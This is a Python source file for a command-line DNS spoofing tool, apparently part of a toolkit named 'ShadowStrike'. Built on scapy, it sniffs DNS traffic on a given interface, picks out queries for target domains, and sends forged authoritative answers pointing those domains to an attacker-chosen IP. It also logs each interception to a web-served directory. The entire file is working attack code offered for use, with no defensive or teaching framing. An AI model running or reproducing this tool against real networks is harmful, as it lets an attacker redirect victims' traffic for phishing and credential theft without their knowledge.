import scapy.all as scapy
from scapy.layers import dns, inet
import argparse
from datetime import datetime

# Initialize log file in overwrite mode
LOG_FILE_PATH = "/var/www/html/ShadowStrike/Logs/dns_log.txt"

def initialize_log():
    try:
        with open(LOG_FILE_PATH, "w") as log_file:
            log_file.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Log initialized.\n")
    except IOError as e:
        print(f"[!] Failed to initialize log file: {e}")

# Function to start sniffing on the specified interface
def start_sniffing(interface, spoofed_domains, spoofed_ip):
    log_message(f"[*] DNS spoofing started on interface: {interface}")
    log_message(f"[*] Spoofed domains: {', '.join(spoofed_domains)}")
    log_message(f"[*] Spoofed IP address: {spoofed_ip}\n")
    
    # Optimized sniffing with DNS filtering
    scapy.sniff(
        iface=interface,
        store=False,
        filter="udp port 53",  # Only capture DNS traffic
        prn=lambda pkt: process_packet(pkt, spoofed_domains, spoofed_ip)
    )

# Function to process DNS packets
def process_packet(packet, spoofed_domains, spoofed_ip):
    try:
        if packet.haslayer(dns.DNSQR):  # If the packet contains a DNS query
            qname = packet[dns.DNSQR].qname.decode().strip()
            
            # Check if query matches any spoofed domain
            if any(domain in qname for domain in spoofed_domains):
                log_message(f"[+] Intercepted DNS request for: {qname}")
                send_spoofed_response(packet, spoofed_ip)
    except Exception as e:
        log_message(f"[!] Error processing packet: {e}")

# Function to craft and send a spoofed DNS response
def send_spoofed_response(packet, spoofed_ip):
    try:
        spoofed_response = (
            scapy.IP(dst=packet[inet.IP].src, src=packet[inet.IP].dst) /  # Swap IP addresses
            scapy.UDP(dport=packet[inet.UDP].sport, sport=packet[inet.UDP].dport) /  # Swap ports
            dns.DNS(
                id=packet[dns.DNS].id,  # Preserve the original DNS transaction ID
                qr=1,  # QR = 1 (Response)
                aa=1,  # Authoritative Answer
                qd=packet[dns.DNS].qd,  # Use original Question section
                an=dns.DNSRR(rrname=packet[dns.DNSQR].qname, ttl=300, rdata=spoofed_ip)  # Spoofed Answer
            )
        )
        scapy.send(spoofed_response, verbose=False)  # Send the crafted packet
        log_message(f"[+] Spoofed response sent: {packet[dns.DNSQR].qname.decode()} -> {spoofed_ip}")
    except Exception as e:
        log_message(f"[!] Error sending spoofed response: {e}")

# Function to log messages with timestamps
def log_message(message):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_entry = f"[{timestamp}] {message}"
    print(log_entry)  # Output to terminal
    try:
        with open(LOG_FILE_PATH, "a") as log_file:
            log_file.write(log_entry + "\n")
    except IOError as e:
        print(f"[!] Failed to write to log file: {e}")

# Main function
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="High-performance DNS Spoofing Tool")
    parser.add_argument("-i", "--interface", required=True, help="Network interface to sniff on (e.g., eth0)")
    parser.add_argument("-d", "--domain", required=True, nargs='+', help="Domains to spoof (e.g., example.com)")
    parser.add_argument("-s", "--spoof-ip", required=True, help="IP address to redirect spoofed domains (e.g., 192.168.1.100)")
    args = parser.parse_args()

    # Initialize log file (overwrite mode)
    initialize_log()

    try:
        # Start DNS sniffing and spoofing
        start_sniffing(args.interface, args.domain, args.spoof_ip)
    except KeyboardInterrupt:
        log_message("[*] DNS spoofing stopped by user.")
    except Exception as e:
        log_message(f"[!] Unexpected error: {e}")
